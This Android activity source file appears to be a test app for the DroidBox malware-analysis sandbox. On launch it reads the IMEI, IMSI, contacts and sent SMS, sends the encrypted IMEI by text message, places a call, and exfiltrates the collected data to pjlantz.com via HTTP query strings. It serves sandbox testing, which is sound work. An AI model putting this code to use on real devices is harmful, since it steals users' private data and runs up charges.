package droidbox.tests;

import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.InvalidKeyException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.List;
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.SecretKeySpec;
import android.app.Activity;
import android.content.ContentValues;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Browser;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;

public class DroidBoxTests extends Activity {

    private String imei, hashedImei, contactName;

    private String encryptedImei, phoneNbr, msg;

    private String fileContent, installedApps;

    private static final byte[] KEY = { 0, 42, 2, 54, 4, 45, 6, 7, 65, 9, 54, 11, 12, 13, 60, 15 };

    private static final byte[] KEY2 = { 0, 42, 2, 54, 4, 45, 6, 8 };

    /** 
     * Called when the activity is first created. 
     */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        this.setupTest();
        this.testAddBookmark();
        this.testGetInstalledApps();
        this.testWriteFile();
        this.testReadFile();
        this.testCryptHash();
        this.testCryptAES();
        this.testCryptDES();
        this.testNetworkHTTP();
        this.testSendSMS();
        this.testPhoneCall();
    }

    /**
     * Setup variables
     */
    public void setupTest() {
        TelephonyManager manager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        imei = manager.getDeviceId();
        String imsi = manager.getSubscriberId();
        fileContent = "";
        Log.v("Evasion", "BRAND: " + Build.BRAND);
        Log.v("Evasion", "DEVICE: " + Build.DEVICE);
        Log.v("Evasion", "MODEL: " + Build.MODEL);
        Log.v("Evasion", "PRODUCT: " + Build.PRODUCT);
        Log.v("Evasion", "IMEI: " + imei);
        Log.v("Evasion", "IMSI: " + imsi);
        String strUri = "content://contacts/people";
        Uri uricontact = Uri.parse(strUri);
        Cursor c = this.getContentResolver().query(uricontact, null, null, null, null);
        while (c.moveToNext()) {
            contactName = c.getString(16);
            Log.v("Contact", "Name: " + contactName);
        }
        strUri = "content://sms/sent";
        Uri urisms = Uri.parse(strUri);
        c = this.getContentResolver().query(urisms, null, null, null, null);
        while (c.moveToNext()) {
            String addr = c.getString(2);
            phoneNbr = addr;
            Log.v("SMSinbox", "To: " + addr);
            msg = c.getString(11);
            Log.v("SMSinbox", "Msg: " + msg);
        }
    }

    /**
     * Add bookmark to a content provider
     */
    public void testAddBookmark() {
        Log.v("Test", "[*] testAddBookmark()");
        ContentValues bookmarkValues = new ContentValues();
        bookmarkValues.put(Browser.BookmarkColumns.BOOKMARK, 1);
        bookmarkValues.put(Browser.BookmarkColumns.TITLE, "Test");
        bookmarkValues.put(Browser.BookmarkColumns.URL, "http://www.pjlantz.com");
    }

    /**
     * Retrieve list with installed apps
     */
    public void testGetInstalledApps() {
        Log.v("Test", "[*] testGetInstalledApps()");
        PackageManager pm = getPackageManager();
        List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
        installedApps = "";
        for (ApplicationInfo packageInfo : packages) installedApps += packageInfo.packageName + ":";
    }

    /**
     * Write a file to the device
     */
    public void testWriteFile() {
        Log.v("Test", "[*] testWriteFile()");
        try {
            OutputStreamWriter out = new OutputStreamWriter(openFileOutput("myfilename.txt", 0));
            out.write("Write a line\n");
            out.close();
            out = new OutputStreamWriter(openFileOutput("output.txt", 0));
            out.write(contactName + "\n");
            out.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /**
     * Test reading file content on device
     */
    public void testReadFile() {
        Log.v("Test", "[*] testReadFile()");
        try {
            InputStream instream = openFileInput("myfilename.txt");
            if (instream != null) {
                InputStreamReader inputreader = new InputStreamReader(instream);
                BufferedReader buffreader = new BufferedReader(inputreader);
                String line;
                while ((line = buffreader.readLine()) != null) {
                    fileContent += line;
                }
            }
            Log.v("FileContent", fileContent);
            instream.close();
            instream = openFileInput("output.txt");
            if (instream != null) {
                InputStreamReader inputreader = new InputStreamReader(instream);
                BufferedReader buffreader = new BufferedReader(inputreader);
                String line;
                fileContent += "&";
                while ((line = buffreader.readLine()) != null) {
                    fileContent += line;
                }
            }
            instream.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /**
     * Make phone call
     */
    public void testPhoneCall() {
        Log.v("Test", "[*] testPhoneCall()");
        Intent callIntent = new Intent(Intent.ACTION_CALL);
        callIntent.setData(Uri.parse("tel:123456789"));
        startActivity(callIntent);
    }

    /**
     * Send a text message
     */
    public void testSendSMS() {
        Log.v("Test", "[*] testSendSMS()");
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("0735445281", null, "Sending sms...", null, null);
        sms = SmsManager.getDefault();
        sms.sendTextMessage("0735445281", null, encryptedImei, null, null);
    }

    /**
     * Usage of AES encryption in crypto API
     */
    public void testCryptAES() {
        Log.v("Test", "[*] testCryptAES()");
        Cipher c;
        try {
            c = Cipher.getInstance("AES");
            SecretKeySpec keySpec = new SecretKeySpec(KEY, "AES");
            c.init(Cipher.ENCRYPT_MODE, keySpec);
            byte[] data = imei.getBytes();
            byte[] enc = c.doFinal(data);
            encryptedImei = this.toHex(enc);
            Cipher d = Cipher.getInstance("AES");
            SecretKeySpec d_keySpec = new SecretKeySpec(KEY, "AES");
            d.init(Cipher.DECRYPT_MODE, d_keySpec);
            d.doFinal(enc);
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        } catch (NoSuchPaddingException e) {
            e.printStackTrace();
        } catch (InvalidKeyException e) {
            e.printStackTrace();
        } catch (IllegalBlockSizeException e) {
            e.printStackTrace();
        } catch (BadPaddingException e) {
            e.printStackTrace();
        }
    }

    /**
     * Usage of DES encryption in crypto API
     */
    public void testCryptDES() {
        Log.v("Test", "[*] testCryptDES()");
        Cipher c;
        try {
            c = Cipher.getInstance("DES");
            SecretKeySpec keySpec = new SecretKeySpec(KEY2, "DES");
            c.init(Cipher.ENCRYPT_MODE, keySpec);
            byte[] data = imei.getBytes();
            byte[] enc = c.doFinal(data);
            encryptedImei = this.toHex(enc);
            Cipher d = Cipher.getInstance("DES");
            SecretKeySpec d_keySpec = new SecretKeySpec(KEY2, "DES");
            d.init(Cipher.DECRYPT_MODE, d_keySpec);
            d.doFinal(enc);
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        } catch (NoSuchPaddingException e) {
            e.printStackTrace();
        } catch (InvalidKeyException e) {
            e.printStackTrace();
        } catch (IllegalBlockSizeException e) {
            e.printStackTrace();
        } catch (BadPaddingException e) {
            e.printStackTrace();
        }
    }

    /**
     * Usage of hashing in the crypto API
     */
    public void testCryptHash() {
        Log.v("Test", "[*] testCryptHash()");
        String testStr = "Hash me";
        byte messageDigest[];
        MessageDigest digest = null;
        try {
            digest = java.security.MessageDigest.getInstance("MD5");
            digest.update(testStr.getBytes());
            messageDigest = digest.digest();
            digest.digest(testStr.getBytes());
            digest = java.security.MessageDigest.getInstance("SHA1");
            digest.update(testStr.getBytes());
            messageDigest = digest.digest();
            digest = null;
            digest = java.security.MessageDigest.getInstance("SHA1");
            digest.update(imei.getBytes());
            messageDigest = digest.digest();
            hashedImei = this.toHex(messageDigest);
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
    }

    /**
     * Usage of HTTP connections
     */
    public void testNetworkHTTP() {
        Log.v("Test", "[*] testNetworkHTTP()");
        URL url = null;
        HttpURLConnection urlConnection = null;
        try {
            url = new URL("http://code.google.com/p/droidbox/");
            urlConnection = (HttpURLConnection) url.openConnection();
            BufferedReader rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
            @SuppressWarnings("unused") String line = "";
            while ((line = rd.readLine()) != null) ;
            url = new URL("http://pjlantz.com/imei.php?imei=" + hashedImei);
            urlConnection = (HttpURLConnection) url.openConnection();
            rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
            while ((line = rd.readLine()) != null) ;
            url = new URL("http://pjlantz.com/phone.php?phone=" + phoneNbr);
            urlConnection = (HttpURLConnection) url.openConnection();
            rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
            while ((line = rd.readLine()) != null) ;
            url = new URL("http://pjlantz.com/msg.php?msg=" + msg.replace(" ", "+"));
            urlConnection = (HttpURLConnection) url.openConnection();
            rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
            url = new URL("http://pjlantz.com/file.php?file=" + fileContent.replace(" ", "+"));
            urlConnection = (HttpURLConnection) url.openConnection();
            rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
            while ((line = rd.readLine()) != null) ;
            url = new URL("http://pjlantz.com/app.php?installed=" + installedApps.replace(" ", "+"));
            urlConnection = (HttpURLConnection) url.openConnection();
            rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
            while ((line = rd.readLine()) != null) ;
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            urlConnection.disconnect();
        }
    }

    /**
     * Returns Hex representation of a byte buffer
     * @param buf Byte buffer
     * @return String with hex representation
     */
    private String toHex(byte[] buf) {
        StringBuffer hexString = new StringBuffer();
        for (int i = 0; i < buf.length; i++) {
            String h = Integer.toHexString(0xFF & buf[i]);
            while (h.length() < 2) h = "0" + h;
            hexString.append(h);
        }
        return hexString.toString();
    }
}
